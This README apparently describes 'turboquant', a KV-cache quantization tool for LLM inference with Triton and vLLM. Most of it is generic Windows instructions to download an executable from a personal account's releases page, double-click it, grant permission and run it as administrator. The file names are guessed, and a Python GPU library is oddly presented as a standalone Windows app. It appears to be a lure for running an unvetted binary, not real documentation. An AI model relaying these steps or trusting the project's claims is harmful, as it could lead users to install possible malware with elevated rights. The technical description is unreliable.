# ⚙️ turboquant - Faster KV Cache, Lower Memory Use

[![Download turboquant](https://img.shields.io/badge/Download-turboquant-blue?style=for-the-badge)](https://github.com/Robertmorrissteelproduction437/turboquant/releases)

## 🧭 What this app does

TurboQuant helps lower memory use during LLM inference by compressing the KV cache. It is built for Windows users who want to run supported releases with less RAM use and smoother model loading.

This project uses:
- 3-bit keys
- 2-bit values
- Triton kernels
- vLLM integration

## 📥 Download and install

Visit this page to download:
https://github.com/Robertmorrissteelproduction437/turboquant/releases

1. Open the release page in your browser.
2. Find the latest release at the top of the page.
3. Download the Windows file for your system.
4. If the file is in a ZIP archive, extract it first.
5. Open the app file or follow the included setup file.

If you see more than one file, pick the one for Windows. Common file names may include:
- `turboquant-windows.zip`
- `turboquant-win64.exe`
- `turboquant-setup.exe`

## 💻 Windows requirements

TurboQuant is made for modern Windows systems.

Recommended setup:
- Windows 10 or Windows 11
- 64-bit processor
- 16 GB RAM or more
- NVIDIA GPU with current drivers
- Enough disk space for the app and model files

If you plan to use it with a large model, more RAM and GPU memory can help.

## 🛠️ How to set it up

1. Download the release file from the link above.
2. Move the file to a folder you can find later, such as Downloads or Desktop.
3. If it is a ZIP file, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the program file.
6. If Windows asks for permission, choose Yes.
7. Follow the on-screen steps until the app opens.

If the app starts from a command window, keep that window open while you use TurboQuant.

## 🚀 First run

After the app opens:
1. Select your model or inference setup.
2. Choose the KV cache quantization option.
3. Keep the default settings if you are unsure.
4. Start the run and wait for the model to load.
5. Watch memory use and response speed in your inference tool.

For first-time use, default settings are the safest choice.

## 🧩 What you get

TurboQuant is useful when you want:
- Lower KV cache memory use
- Better fit for large models
- Support for Triton-based kernels
- Use with vLLM workflows
- Faster inference setup on supported hardware

It focuses on the cache layer, which helps reduce memory pressure during model use.

## 📌 Simple usage flow

A typical flow looks like this:
1. Download the release.
2. Extract the files.
3. Run the app.
4. Point it to your model or inference setup.
5. Turn on KV cache quantization.
6. Start inference.

If your setup already uses vLLM, TurboQuant fits into that flow with less manual work.

## 🧠 Tips for best results

- Close other heavy apps before you run a large model.
- Use the latest NVIDIA driver.
- Keep model files on a fast drive.
- Start with default cache settings.
- Test with a smaller model first if you are new to LLM tools.
- Use a system with enough VRAM for the model you want to run.

## 🔍 Common file types you may see

You may see one of these in the release:
- `.zip` for a packaged Windows build
- `.exe` for a direct app launch
- `.msi` for a Windows installer
- `README.txt` for setup steps
- `config.json` for app settings

If a release includes a setup file, use that first. If it includes a portable build, extract it and run the main app file.

## ❓ Troubleshooting

### The file does not open
- Make sure you extracted the ZIP file first.
- Right-click the app and choose Run as administrator.
- Check that Windows did not block the file.

### The app closes right away
- Open it from a command window if the release says to do that.
- Look for a missing support file in the folder.
- Download the latest release again.

### The model loads slowly
- Use a faster drive.
- Close memory-heavy apps.
- Check that your GPU driver is current.
- Try a smaller model to test your setup.

### Windows says it cannot find a file
- Keep all release files in the same folder.
- Do not rename files unless the release notes say you can.
- Extract the full ZIP archive before starting.

## 📁 Suggested folder setup

A simple folder layout helps keep things organized:

- `C:\TurboQuant\`
  - `app\`
  - `models\`
  - `logs\`
  - `config\`

This makes it easier to find the files if you need to change settings or check errors.

## 🔗 Download again if needed

If you need the release files again, use this page:
https://github.com/Robertmorrissteelproduction437/turboquant/releases

## 📋 What to check before you start

- You are using Windows 10 or 11
- You downloaded the latest release
- You extracted the ZIP file if needed
- You ran the correct Windows file
- Your GPU drivers are up to date
- You have enough free disk space